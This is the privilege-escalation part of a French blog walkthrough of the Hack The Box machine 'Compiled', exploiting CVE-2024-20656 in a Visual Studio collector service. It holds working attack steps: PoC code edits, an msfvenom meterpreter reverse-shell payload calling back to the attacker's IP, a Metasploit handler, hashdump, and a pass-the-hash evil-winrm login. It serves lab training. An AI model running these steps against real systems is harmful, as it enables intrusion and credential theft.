</code></pre><p><img src=/images/HTB-Compiled/MVS_2019.png alt="MS Visual Studio winpeas"></p><p>Dans <code>C:\Users\Emily\Documents</code>, nous trouvons également un répertoire pour <code>Visual Studio 2019</code>.</p><p><img src=/images/HTB-Compiled/VS_Studio_2019.png alt="VS Studio 2019"></p><p>En cherchant <code>MofCompiler.exe cve</code> sur Google, nous trouvons le <a href=https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/>CVE-2024-20656</a> avec un PoC <a href=https://github.com/ruycr4ft/CVE-2024-20656/tree/main>ici</a>.</p><p>Comme indiqué dans l&rsquo;article, <code>VSStandardCollectorService150</code> est exécuté sous le compte <code>LocalSystem</code> sur notre cible.</p><p><img src=/images/HTB-Compiled/VSStandard_service.png alt=VSStandardCollectorService150></p><p>Nous devons modifier l&rsquo;exploit pour qu&rsquo;il fonctionne. En examinant le contenu de <code>main.cpp</code> sur le dépôt Github du PoC, nous remarquons que l&rsquo;emplacement de <code>VSDiagnostics.exe</code> est référencé. Nous devons modifier cette ligne avec le bon répertoire et la bonne année (2019 dans notre cas).</p><blockquote><p><code>VSDiagnostics.exe</code> est un outil de diagnostic inclus dans Microsoft Visual Studio. Il est principalement utilisé pour analyser et résoudre les problèmes dans Visual Studio ou dans les applications développées à l&rsquo;aide de Visual Studio.</p></blockquote><p><img src=/images/HTB-Compiled/MSVS_location.png alt="MSVS location"></p><pre tabindex=0><code>WCHAR cmd[] = L&#34;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe&#34;;
</code></pre><p>Nous devons également modifier la fonction <code>cb1</code> avec le chemin d&rsquo;accès à notre fichier exe malveillant. Ce fichier sera copié et renommé en <code>MofCompiler.exe</code> lorsque nous exécuterons le service.</p><p><img src=/images/HTB-Compiled/cb1_function.png alt="cb1 function"></p><pre tabindex=0><code>CopyFile(L&#34;c:\\tmp\\rev.exe&#34;, L&#34;C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe&#34;, FALSE);
</code></pre><p>Pour obtenir le fichier <code>Expl.exe</code>, nous devons compiler le projet spécifiquement pour la version 2019 avec Visual Studio (ce qui nécessite une machine Windows).</p><p>Si vous avez Visual Studio 2022 comme moi, vous devrez spécifier le Toolset 2019 pour la compilation. Sur votre machine Windows, trouvez <code>vs_installer.exe</code>, le mien se trouve dans <code>C:\Program Files (x86)\Microsoft Visual Studio\Installer</code>.</p><p><img src=/images/HTB-Compiled/vs_installer.png alt="vs installer"></p><p>Après l&rsquo;avoir ouvert, sélectionnez <code>Modify</code>.</p><p><img src=/images/HTB-Compiled/vsstudio_modify.png alt="vs modify"></p><p>Ensuite, allez dans la section <code>Individual Components</code>, recherchez <code>v142</code>, sélectionnez <code>MSVC v142 - VS 2019 C++ x64/x86 build tools</code> et cliquez sur <code>Modify</code> pour installer les composants.</p><p><img src=/images/HTB-Compiled/v142.png alt="v142 build tools"></p><p>Clonez le dépôt du PoC, lancez Visual Studio et sélectionnez <code>Open a project or solution</code> (Ouvrir un projet ou une solution). Trouvez le répertoire <code>CVE-2024-20656</code> et ouvrez le fichier <code>Expl.sln</code> dans le répertoire <code>Expl</code>. Vous devriez maintenant avoir tous les fichiers ouverts dans le menu <code>Solution Explorer</code>.</p><p><img src=/images/HTB-Compiled/SE_menu.png alt="Solution Explorer"></p><p>Faites un clic droit sur le menu <code>Solution Explorer</code> et sélectionnez <code>Properties</code> en bas. Vous pouvez aussi utiliser <code>Alt + Enter</code> pour faire la même chose.</p><p>Sous <code>Configuration Properties</code> -> <code>General</code>, configurez le <code>Platform Toolset</code> sur <code>Visual Studio 2019 (v142)</code> et cliquez sur <code>Apply</code>.</p><p><img src=/images/HTB-Compiled/v142_apply.png alt="v142 apply"></p><p>Cliquez maintenant sur <code>main.cpp</code> pour commencer à le modifier. Voici la première modification:</p><p><img src=/images/HTB-Compiled/WCHAR_modification.png alt="WCHAR modification"></p><p>Et voici le deuxième:</p><blockquote><p>Vous pouvez choisir n&rsquo;importe quel emplacement pour le fichier malveillant, mais assurez-vous que vous avez toutes les permissions sur le répertoire.</p></blockquote><p><img src=/images/HTB-Compiled/cb1_modification.png alt="void cb1 modification"></p><p>Pour compiler le projet, cliquez sur <code>Build</code> dans le menu tout en haut -> <code>Batch Build</code> -> cochez <code>Release|x64</code> -> et cliquez sur <code>Build</code>.</p><p><img src=/images/HTB-Compiled/compiling.png alt="compiling process"></p><p>Une fois la compilation réussie, nous avons un nouveau répertoire appelé <code>x64</code> et à l&rsquo;intérieur du répertoire <code>Release</code> se trouve notre fichier <code>Expl.exe</code>.</p><p><img src=/images/HTB-Compiled/expl_exe.png alt="Expl.exe file"></p><p>Créez le fichier malveillant <code>rev.exe</code> avec msfvenom.</p><pre tabindex=0><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -o rev.exe
</code></pre><p><img src=/images/HTB-Compiled/bad_exe.png alt="malicious exe file"></p><p>Préparez le listener dans Metasploit.</p><pre tabindex=0><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost &lt;YOUR_IP&gt;
set lport &lt;PORT_NUMBER&gt;
run
</code></pre><p><strong>Pour les étapes suivantes, assurez-vous d&rsquo;avoir à la fois un shell RunasCs et un shell evil-winrm pour Emily.</strong></p><p>Avec le shell RunasCs, créez le répertoire <code>tmp</code> dans <code>C:\</code> et placez-y <code>rev.exe</code> et <code>Expl.exe</code>.</p><p><img src=/images/HTB-Compiled/tmp_directory.png alt="tmp directory"></p><p>Exécutez la commande suivante dans le shell evil-winrm:</p><pre tabindex=0><code>./RunasCs.exe Emily &#34;12345678&#34; C:\tmp\Expl.exe
</code></pre><p>Après environ une minute, nous obtenons un shell meterpreter en tant que <code>NT AUTHORITY\SYSTEM</code>, et trouvons le drapeau root dans <code>C:\Users\Administrator\Desktop</code>.</p><p><img src=/images/HTB-Compiled/root_shell.png alt="root shell"></p><p><img src=/images/HTB-Compiled/root_flag.png alt="root flag"></p><p>De plus, nous pouvons utiliser <code>hashdump</code> pour obtenir tous les hashs des utilisateurs.</p><p><img src=/images/HTB-Compiled/hashdump.png alt=hashdump></p><p>Avec le hash de l&rsquo;administrateur, nous pouvons nous connecter via evil-winrm. C&rsquo;est une façon d&rsquo;établir la persistance afin de ne pas avoir à répéter le processus d&rsquo;exploitation.</p><pre tabindex=0><code>evil-winrm -i compiled.htb -u Administrator -H f75c95bc9312632edec46b607938061e
</code></pre><p><img src=/images/HTB-Compiled/root_evil-winrm.png alt="evil-winrm root shell"></p><p>Je vous remercie d&rsquo;avoir lu cet article et j&rsquo;espère qu&rsquo;il vous a été utile!</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-axlle/>&#8592;
Précédent:
HTB: Axlle</a></p><p class=prev-post-date>novembre 15, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-monitorsthree/>Suivant:
HTB: MonitorsThree
&#8594;</a></p><p class=next-post-date>janvier 17, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a><ul><li><a href=#explication-de-lexploitation>Explication de l&rsquo;exploitation</a></li></ul></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#mouvement-latéral-shell-en-tant-que-emily>Mouvement latéral (shell en tant que Emily)</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>